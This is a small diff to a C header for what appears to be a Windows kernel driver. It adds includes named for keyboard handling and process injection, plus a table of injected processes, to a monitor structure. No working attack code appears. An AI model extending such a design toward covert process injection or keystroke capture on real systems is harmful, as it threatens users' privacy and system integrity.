@@ -1,8 +1,12 @@
 #pragma once
 
 #include <inc/drvmain.h>
+
 #include <inc/sysworker.h>
 #include <inc/mwsk.h>
+#include <inc/keybrd.h>
+#include <inc/inject.h>
+#include <inc/thash.h>
 
 #define MONITOR_STATE_STOPPED 1
 #define MONITOR_STATE_STARTED 2
@@ -13,6 +17,7 @@ typedef struct _MONITOR {
 	SYSWORKER		InjectWorker;
 	volatile LONG	State;
 	KGUARDED_MUTEX	Mutex;
+	THASH			InjectedProcTable;
 } MONITOR, *PMONITOR;
 
 VOID
